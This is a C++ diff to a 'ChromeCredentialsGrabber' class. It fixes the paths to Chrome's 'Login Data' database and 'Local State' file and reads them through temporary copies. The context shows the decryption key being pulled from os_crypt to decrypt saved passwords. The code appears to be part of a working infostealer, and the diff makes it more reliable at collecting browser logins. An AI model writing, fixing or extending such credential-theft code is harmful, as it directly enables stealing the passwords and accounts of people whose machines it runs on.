@@ -6,6 +6,7 @@
 #include "Crypto/Base64.hpp"
 #include "Crypto/Protection.hpp"
 #include "Filesystem/File.hpp"
+#include "Filesystem/TemporaryFile.hpp"
 #include "Sql/InMemorySqliteDatabase.hpp"
 #include "Sql/SqliteRowIterator.hpp"
 #include "Utils/Buffer.hpp"
@@ -45,14 +46,16 @@ static std::tuple<Buffer, Buffer> parse_password(const Buffer& password)
 std::optional<Credentials> ChromeCredentialsGrabber::grab_credentials() const
 {
 	const std::filesystem::path chrome_root_folder = Environment::expand_variables(CHROME_ROOT_FOLDER);
-	const std::filesystem::path user_data_folder = chrome_root_folder / "User Data";
-	const std::filesystem::path login_data_db_path = user_data_folder / L"Login Data";
-	const std::filesystem::path local_state_path = user_data_folder / "Local State";
+	const std::filesystem::path user_data_folder = chrome_root_folder / L"User Data";
+	const std::filesystem::path login_data_db_path = user_data_folder / L"Default" / L"Login Data";
+	const std::filesystem::path local_state_path = user_data_folder / L"Local State";
 
 	const InMemorySqliteDatabase login_data_db(
-		File(login_data_db_path, File::Mode::READ, File::Disposition::OPEN).read()
+		TemporaryFile(login_data_db_path).read()
 	);
-	const Json local_state = Json::parse(File(local_state_path, File::Mode::READ, File::Disposition::OPEN).read());
+	const Json local_state = Json::parse(
+		TemporaryFile(local_state_path).read()
+	);
 
 	const auto aes_key = parse_key(local_state["os_crypt"]["encrypted_key"].get<std::string>());
 
